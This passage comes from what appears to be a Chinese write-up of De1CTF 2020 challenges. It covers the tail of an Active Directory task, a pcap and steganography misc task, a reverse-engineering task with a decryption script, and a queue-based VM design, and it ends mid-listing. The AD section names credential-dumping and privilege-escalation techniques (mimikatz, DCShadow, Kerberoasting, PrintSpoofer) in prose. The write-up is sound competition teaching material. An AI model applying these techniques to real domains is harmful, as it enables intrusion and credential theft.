alt><figcaption>37.png</figcaption></figure><p>整个过程如下：</p><p>PS：有时候因为网络问题RPC那端可能会没有显示同步完成，这个属于正常现象，不影响把数据同步到域控上。</p><figure><img src="https://i.loli.net/2020/05/05/3LARC8ax2MBQJWY.gif" alt><figcaption>9.gif</figcaption></figure><h3><span id="end">End</span></h3><p>提一下，这道题有几个上车的点： 1. 如果是使用mimikatz.exe的<code>!processtoken</code>提升为system权限，会将当前进程的所有mimikatz、cmd都提升为system权限。 2. Dcshadow那步没有将权限还原，可能导致其它选手直接上车（有2、3个队就是上了这个车）。 3. 注册SPN那步没有将De1ta用户的SPN给删掉，可能导致其它选手直接<code>Kerberoasting</code>上车。</p><p>还有选手问的几个比较多的问题，我这里提一下： 1. 为什么De1ta的密码能用logonpasswords导出来 解：因为有人提权之后拿De1ta用户登陆了DM，所以在内存中缓存了密码 2. 为什么使用De1ta用户能直接登陆域控getflag 解：因为上一个队伍Dcshadow之后De1ta用户是高权限，并且没有及时清理掉权限 3. 为什么不用基于资源的约束委派也能提权 解：其实这里有两个非预期提权的，虽然最后这两个提权都修了，但是还是有一个队伍利用PrintSpoofer提权并且拿到了flag Orz，一个是土豆（修题：禁用DCOM），一个是PrintSpoofer（修题：禁用SeImpersonatePrivilege）。PrintSpoofer是我没想到，这个提权方法是比赛结束后我才在推特上看到的，提权方法是5.2公布的，比赛刚好是5.2，搞得修题跟应急似的 4. 为什么用Rebeus导入的票据使用不了 解：这个具体原因我也不是很清楚，但是用impacket是没有什么问题的</p><p>最后非常感谢各位师傅的认真做题没有给题目搅屎Orzzzzzzz</p><h2><span id="misc_chowder">Misc_Chowder</span></h2><p>赛题给了一个流量包，使用wireshark打开，选择菜单栏“文件-导出对象-HTTP”，可以发现有7个内容类型为<code>multipart/form-data</code>，这些都是上传的一些数据。</p><figure><img src="https://i.loli.net/2020/05/06/Ccub47IsZDMRYT9.png" alt><figcaption>1588654908630.png</figcaption></figure><p>把内容提取出来，可以发现有6个是jpg，有一个是png，包含png图片数据的是上面分组号为3075的数据包，把它save保存下来，然后拖进winhex，找到png数据的开头和结尾(此png的文件头为 89504E47 ，文件尾为 426082 )，结合快捷键alt+1、alt+2、ctrl+x即可完成切割，提取得到png图片，得到另一个附件的链接。</p><figure><img src="https://i.loli.net/2020/05/06/bNfZDhv3aI4PGnM.png" alt><figcaption>123.png</figcaption></figure><p>得到一个readme.zip，解压发现有个readme.docx（其实这里本来还设计了一个zip伪加密，但是文件一上传drive.google，伪加密就不见了，不知道为啥）。</p><p>在<code>readme.docx</code>里发现藏有zip文件，直接把后缀改为zip，即可提取出来<code>You_found_me_Orz.zip</code>。这个zip文件需要暴力破解得到密码（可能由于存在缓存的原因，出题人在自己电脑测试的时候爆破出当时设计的6位密码的时间并不长，后面重装了一下软件，发现确实爆破时间很长，于是给了提示“密码是由6位字符组成，开头的2个字符是DE”），爆破得到密码为<code>DE34Q1</code>。</p><figure><img src="https://i.loli.net/2020/05/06/RaTcEAtufyWJZoK.png" alt><figcaption>1588656395938.png</figcaption></figure><p>解压得到一个图片<code>You_found_me_Orz.jpg</code>，拖进notepad++、winhex等工具可以发现还有里面还有666.jpg、flag.txt、fffffffflllll.txt等文件，并且发现了rar的一些标志。</p><figure><img src="https://i.loli.net/2020/05/06/UoWJA1RF4zmMdf7.png" alt><figcaption>1588655950372.png</figcaption></figure><p>直接把后缀名改为rar即可解压出里面的文件。其中flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;jaivy say that you almost get me!!! &#125;</span><br></pre></td></tr></table></figure><p>是一个假的flag(这点好多老外过来问...)，并且发现fffffffflllll.txt并没有出现，这里考察的是ADS隐写，也可以通过上图当中的<code>:fffffffflllll.txt</code>看出一些端倪，因为ADS隐写的一些数据一般都是这样子的<code>xxx:xxxxxx</code>。使用<code>Shortcut to NTFS Streams Info</code>工具即可看到藏在666.jpg中的ADS隐写数据获得真正的flag。</p><figure><img src="https://i.loli.net/2020/05/06/KvL1X6YP7DedxrR.png" alt><figcaption>1588656264938.png</figcaption></figure><p>提取得到flag为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;E4Sy_M1sc_By_Jaivy_31b229908cb9bb&#125;</span><br></pre></td></tr></table></figure><h1><span id="reverse">reverse</span></h1><h2><span id="parser">parser</span></h2><h3><span id="出题思路">出题思路</span></h3><p>最近在学编译原理，写了个极其简单的词法分析器和语法分析器来解析flag。</p><p>首先词法分析提取token，不满足要求的会抛出异常</p><p>文法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">∑ ：</span><br><span class="line">De1CTF    &quot;De1CTF&quot;</span><br><span class="line">LB            &quot;&#123;&quot;</span><br><span class="line">RB            &quot;&#125;&quot;</span><br><span class="line">WORD        &quot;[0-9a-zA-Z]+&quot;</span><br><span class="line">ADD            &quot;+&quot;</span><br><span class="line">UL            &quot;_&quot;</span><br><span class="line">LP            &quot;(&quot;</span><br><span class="line">RP            &quot;)&quot;</span><br><span class="line">CR            &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">N ：</span><br><span class="line">FLAG, PRIM, EXP, TERM, WORD</span><br><span class="line"></span><br><span class="line">P ：</span><br><span class="line">FLAG -&gt; De1CTF LB EXP RB CR</span><br><span class="line">EXP -&gt;  TERM</span><br><span class="line">      | TERM ADD TERM</span><br><span class="line">TERM -&gt; PRIM</span><br><span class="line">          | PRIM UL TERM</span><br><span class="line">PRIM -&gt; WORD</span><br><span class="line"></span><br><span class="line">S : FLAG</span><br></pre></td></tr></table></figure><p>其实就是跟四则运算一样</p><p>首先所有WORD都会被RC4加密一下</p><p>a + b被定义为aes_encrypt(ab)</p><p>a _ b被定义为des_encrpt(ab)</p><p>_的优先级比+要高，没有实现括号，因为括号会产生多解（无限加括号）。除非对括号进行其他操作的定义，但我觉得没必要</p><p>编译时没有开启编译优化。（看了一眼O3后的，我自己都看不懂，开了怕不是被打</p><p>但是由于用了9.0的g++，新特性添加了endbr64指令（漏洞缓解机制，具体不太懂），导致IDA得不到plt表的信息，但是GDB或者用ida调试起来可以看。。。</p><p>符号表保留了挺多有用的信息，所以strip了。</p><h3><span id="逆向">逆向</span></h3><p>由于是用C++编写的，逆向的难度较大。就算O0也挺难纯静态做。</p><p>首先可以随便输点什么测试一下，不难发现输入的格式和结构。</p><p>最好的办法应该是一边调试一边跟踪数据流，很快会发现输入在<code>sub_35F0</code>被分割成一个一个token，不难分析出token的种类。所有token被存进一个<code>std::vector</code>。</p><p>跟踪存放token的vector来到<code>sub_4E70</code>和<code>sub_507E</code>，这里递归的调用了<code>sub_507E</code>最终来到<code>sub_51CC</code>，类型为4的token（也就是单个字符串）被RC4加密。</p><p>返回到<code>sub_507E</code>。这里是一个循环，结束的条件为下一个token不是<code>_</code>。继续递归调用<code>sub_507E</code>解析出一个字符串后，讲两个字符串拼接然后des加密。</p><p>继续返回，来到<code>sub_4E70</code>，依然是一个循环，结束条件为下一个token不是<code>+</code>。然后又调用<code>sub_507E</code>，解析一个新的结果出来，两个结果拼接后aes加密。</p><p>所有的结果都是用<code>std::string</code>链接起来的，最后和<code>unk_8040</code>常量对比。</p><p>到这里基本就完全逆完了。比较重要的事情是+和_的优先级是不一样的，这是解题的关键。</p><p>加密算法全部用的PKCS7来pad，全部是标准的加密算法，（AES的S盒替换这一步没有直接查表，而是按照S盒生成原理写的，所以找不到S盒。但是观察AES的10轮结构应该很轻松能看出来），结合调试和验证也能发现是正常标准的加密算法，分组模式是CBC（ECB的话求解起来可能更复杂一些），密钥都为De1CTF，也用PKCS7来pad到正确的长度。</p><h3><span id="解法">解法</span></h3><p>注意到所有的明文都通过PKCS7pad到正确的长度，所以我们可以通过尝试判断当前这一步是aes还是des。</p><p>拿到常量后，考虑这是<code>A+B+C+D</code>这种的结果还是<code>A_B_C_D</code>这种。通过解密发现aes解密结果有padding，所以就有：</p><p>result = aes(result_before+D)</p><p>尽管我们不知道前一部分有多少个项，但是最后一部分一定只有一个项。接下来要确认这一项是<code>d1_d1_d3</code>这种形式（des的密文）还是单独的一个字符串<code>d1</code>（rc4的密文）。</p><p>尽管我们仍然不知道最后一项有多长，但由于前面一部分大概率是aes或des的密文（如果前一部分是rc4密文，就意味着我们对着整体解rc4就能拿到第一部分的明文了），所以我们在后一部分只要考虑8*n的长度即可。对后8*n字节解des或rc4，寻找padding或明文，然后在对后一部分讨论rc4与des的组合情况，这里就比较容易了。</p><p>以此类推，我们就可以恢复所有部分的明文，根据加密关系补上符号就是flag了。</p><p>详细的分析在脚本里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4, AES, DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">key = <span class="string">b"De1CTF"</span></span><br><span class="line">rc4_key = key</span><br><span class="line">des_key = key.ljust(<span class="number">8</span>, <span class="string">b"\x02"</span>)</span><br><span class="line">aes_key = key.ljust(<span class="number">16</span>, <span class="string">b"\x0a"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_decrypt</span><span class="params">(cipher, key=rc4_key)</span>:</span></span><br><span class="line">    rc4 = ARC4.new(key)</span><br><span class="line">    <span class="keyword">return</span> rc4.decrypt(cipher)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_decrypt</span><span class="params">(cipher, key=aes_key)</span>:</span></span><br><span class="line">    aes = AES.new(key, iv=key, mode=AES.MODE_CBC)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(cipher)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_decrypt</span><span class="params">(cipher, key=des_key)</span>:</span></span><br><span class="line">    des = DES.new(key, iv=key, mode=AES.MODE_CBC)</span><br><span class="line">    <span class="keyword">return</span> des.decrypt(cipher)</span><br><span class="line">flag = <span class="string">b"&#125;"</span></span><br><span class="line">cipher = <span class="string">b"\xe7\xa43L\xd3\x11\xe7\x85hV\x97\x11\xee\xd2\xf8\xd9&gt;p\xc9N\x94\xa02Z'\x98\x00\x1d\xd5\xd7\x11\x1d\xf4\x85a\xac\x0c\x80'@\xbd\xdd\x1f\x0b\xb4\x97\x1f`[T\xcb\xc5\xa8\xb7\x11\x90\xc9\xb5\x81eS\x0f~\x7f"</span></span><br><span class="line"><span class="comment"># 不太可能直接解rc4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别尝试des和aes解密，在aes中发现了padding，说明结果是A+B的形式</span></span><br><span class="line">print(des_decrypt(cipher))</span><br><span class="line"><span class="comment"># b'\x0e\x08r\xa8C\x14u\xae\xee\xd6)9.Q\xd3\xca|\xcf.\xde\xb9&lt;\x8f4N\xcaP%X&gt;5,\x1fIu\x89\xd5\xb3\xf5[1\x9b\x86Q\x86&amp;\x05\xc8FGW\xf3\xfd&amp;\xb4[#\x16O4\x94:h\x90'</span></span><br><span class="line">print(aes_decrypt(cipher))</span><br><span class="line"><span class="comment"># b"\x0b\x82z\x9e\x00.\x07m\xe2\xd8L\xac\xb1#\xbc\x1e\xb0\x8e\xbe\xc1\xa4T\xe0\xf5P\xc6]7\xc5\x8c&#125;\xaf-H'4-;\x13\xd9s\x0f%\xc1v\x89\x19\x8b\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10"</span></span><br><span class="line">cipher = unpad(aes_decrypt(cipher), <span class="number">16</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于解析时是循环加上TERM的，所以后一部分必然是一个TERM，因此我们先讨论后一部分更合适</span></span><br><span class="line"><span class="comment"># 既然B是一个TERM，那么要么直接是一个WORD，直接rc4解密并不能发现正常结果</span></span><br><span class="line"><span class="comment"># 要么就是b1_b2的形式。根据des分组长度为8字节，爆破des的分组数目</span></span><br><span class="line"><span class="comment"># 最后在长度为16时发现了des的padding</span></span><br><span class="line">print(des_decrypt(cipher[<span class="number">-8</span>:]))</span><br><span class="line"><span class="comment"># b'G*\x11p~z\x16\xdc'</span></span><br><span class="line">print(des_decrypt(cipher[<span class="number">-16</span>:]))</span><br><span class="line"><span class="comment"># b'\xcd\xc55\x89\x9f#\xf0\xb2.\x07\x07\x07\x07\x07\x07\x07'</span></span><br><span class="line">term_1 = unpad(des_decrypt(cipher[<span class="number">-16</span>:]), <span class="number">8</span>)</span><br><span class="line">cipher = cipher[:<span class="number">-16</span>] <span class="comment"># 前一部分放到后面讨论</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b1_b2的形式，跟之前+的分析类似，从后往前找WORD，再讨论b1的情况</span></span><br><span class="line"><span class="comment"># 正常来说只能知道后面是单独的WORD，所以要爆破这一部分rc4明文长度</span></span><br><span class="line"><span class="comment"># 当然，这里的长度足够短，可以猜测就是两个WORD，直接rc4解密就能看到第一个WORD，剩下的是另一个</span></span><br><span class="line">print(rc4_decrypt(term_1))</span><br><span class="line"><span class="comment"># 开头发现了有意义的字符串`4nd`</span></span><br><span class="line">print(rc4_decrypt(term_1[<span class="number">3</span>:]))</span><br><span class="line"><span class="comment"># b"p4r53r"</span></span><br><span class="line">word_1 = rc4_decrypt(term_1[<span class="number">3</span>:])</span><br><span class="line">word_2 = rc4_decrypt(term_1[:<span class="number">3</span>])</span><br><span class="line">flag = word_2 + <span class="string">b"_"</span> + word_1 + flag</span><br><span class="line">flag = <span class="string">b"+"</span> + flag</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来又和一开始一样了，重复一遍。先试一下aes和des，判断是单独的TERM还是两部分相加（当然还有直接是一个WORD的可能）</span></span><br><span class="line"><span class="comment"># 还是在aes中发现了padding，依然是A+B的形式</span></span><br><span class="line">print(des_decrypt(cipher))</span><br><span class="line"><span class="comment"># b"\xa7\xaf\xa7\xe8#I\x9e#6X\x19\xed\xd5\x06\xcc\x86\xe4OC\x89 \x15\xff'\xd8\xe1f\x95\xfc\x99\xf8\x1e"</span></span><br><span class="line">print(aes_decrypt(cipher))</span><br><span class="line"><span class="comment"># b'\x91\x98=\xa9\xb1:1\xef\x04r\xb5\x02\x07;h\xdd\xbd\xdb&lt;\xc1&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'</span></span><br><span class="line">cipher = unpad(aes_decrypt(cipher), <span class="number">16</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 依然是爆破后面一个TERM的长度</span></span><br><span class="line">print(des_decrypt(cipher[<span class="number">-8</span>:]))</span><br><span class="line">print(des_decrypt(cipher[<span class="number">-16</span>:]))</span><br><span class="line"><span class="comment"># 长度为16时发现padding，剩下的就是前一部分</span></span><br><span class="line">term_2 = unpad(des_decrypt(cipher[<span class="number">-16</span>:]), <span class="number">8</span>)</span><br><span class="line">cipher = cipher[<span class="number">0</span>:<span class="number">-16</span>]</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 依然是可以猜测两个WORD组成</span></span><br><span class="line">print(rc4_decrypt(term_2))</span><br><span class="line"><span class="comment"># 开头发现了有意义的字符串b"w0rld"</span></span><br><span class="line">print(rc4_decrypt(term_2[<span class="number">5</span>:]))</span><br><span class="line"><span class="comment"># b"l3x3r"</span></span><br><span class="line">word_3 = rc4_decrypt(term_2[<span class="number">5</span>:])</span><br><span class="line">word_4 = rc4_decrypt(term_2[:<span class="number">5</span>])</span><br><span class="line">flag = word_4 + <span class="string">b"_"</span> + word_3 + flag</span><br><span class="line">flag = <span class="string">b"+"</span> + flag</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 剩下的内容很短，直接解rc4</span></span><br><span class="line">print(rc4_decrypt(cipher))</span><br><span class="line">word_5 = rc4_decrypt(cipher)</span><br><span class="line">flag = word_5 + flag</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b"De1CTF&#123;"</span> + flag</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>感觉可以根据padding写一个自动求解的脚本。不过处理起来挺麻烦的，就没有尝试</p><h2><span id="flw">FLW</span></h2><h3><span id="queuevirtualmachine">QueueVirtualMachine</span></h3><h3><span id="virtualmachine">VirtualMachine</span></h3><p><code>unsigned char flag[] = "de1ctf{Innocence_Eye&amp;Daisy*}";</code></p><p>这是一个基于队列的虚拟机。</p><p>虚拟机的结构如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueVirtualMachine</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    QueueVirtualMachine();</span><br><span class="line">    QueueVirtualMachine(<span class="keyword">unsigned</span> <span class="keyword">char</span>*);</span><br><span class="line">    ~QueueVirtualMachine();</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printQueueMemSpace</span><span class="params">()</span></span>; <span class="comment">//用于获取调试信息</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printMemSpace</span><span class="params">()</span></span>;      <span class="comment">//用于获取调试信息</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> head,tail;         <span class="comment">//队列的头，尾指针</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> reg;    <span class="comment">//用于计算分组base58的寄存器</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *queueMemSpace;<span class="comment">//队列空间</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *memSpace;     <span class="comment">//内存空间</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *codeSpace;    <span class="comment">//代码段</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *tempString;   <span class="comment">//字符串缓冲区</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>虚拟机的指令如下：</p><ul><li>14 xx</li></ul><p>将一个数字压入队列的尾部</p><ul><li>15</li></ul><p>丢弃一个队尾元素</p><ul><li>20 xx</li></ul><p>将队列头部的一个字节放入<code>memSpace[xx]</code>的位置</p><ul><li>2a xx</li></ul><p>将<code>memspace[xx]</code>的一个字节压入队列尾部</p><ul><li>2b</li></ul><p>取队列头部的一个数据作为索引，将memspace[]的一个字节压入队列尾部</p><ul><li>2c</li></ul><p>取队列头部的一个数据作为索引，将队列中的下一个字节放入memspace[]</p><ul><li>30</li></ul><p>先左移reg 8位，然后reg加上队尾元素</p><ul><li>31 xx</li></ul><p>寄存器中的short除以xx,余数入队列，商在reg中</p><ul><li>32</li></ul><p>取队列头部的一个byte作为table[]的索引取值，取值结果入队列</p><ul><li>33</li></ul><p>取队列头部的两个数据相加，结果入队列</p><ul><li>34</li></ul><p>取队列头部的两个数据相减，结果入队列。</p><p>注意，减数在队首</p><ul><li>35</li></ul><p>取队列头部的两个数据相×，结果入队列</p><ul><li>36</li></ul><p>寄存器中的数据入队列，并清空寄存器</p><ul><li>37</li></ul><p>取队列头部的两个数据相异或，结果入队列</p><ul><li>3a</li></ul><p>读入一个字符串，字符串放在缓冲区，字符串长度入队列</p><ul><li>40 xx</li></ul><p>取队列头部的一个数字，如果该数字【不】为0，则</p><p><code>op -= xx</code></p><ul><li>41</li></ul><p>缓冲区中的字符串入队列，清空缓冲区</p><ul><li>ab</li></ul><p>指令执行完毕，返回true</p><ul><li>ff</li></ul><p>如果队列头部的数据不为0，则虚拟机返回bool值<code>false</code></p><h3><span id="算法设计">算法设计</span></h3><p>1.读取字符串、检测长度、移入memSpace</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cin&gt;&gt;tempString;</span></span><br><span class="line"><span class="number">0x3a</span>,</span><br><span class="line"><span class="comment">//if(strlen(tempString)!=28)return false;</span></span><br><span class="line"><span class="number">0x14</span>,<span class="number">28</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="comment">//将缓冲区中暂存的字符串移入缓冲区</span></span><br><span class="line"><span class="number">0x41</span>,</span><br><span class="line"><span class="comment">//从队列中移入内存</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x19</span>,<span class="comment">//d</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1a</span>,<span class="comment">//e</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1b</span>,<span class="comment">//1</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1c</span>,<span class="comment">//c</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1d</span>,<span class="comment">//t</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1e</span>,<span class="comment">//f</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1f</span>,<span class="comment">//&#123;</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x20</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x22</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x23</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x24</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x26</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x27</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x28</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x29</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2b</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2c</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2d</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2e</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2f</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x31</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x32</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x33</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x34</span>,<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><ol start="2" type="1"><li>检测flag的格式</li></ol><p>下面这几个检测分布在虚拟机指令的各个角落</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x2a</span>,<span class="number">0x19</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'d'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1a</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'e'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1b</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'1'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1c</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'c'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'t'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1e</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'f'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1f</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'&#123;'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'&#125;'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br></pre></td></tr></table></figure><p>花指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 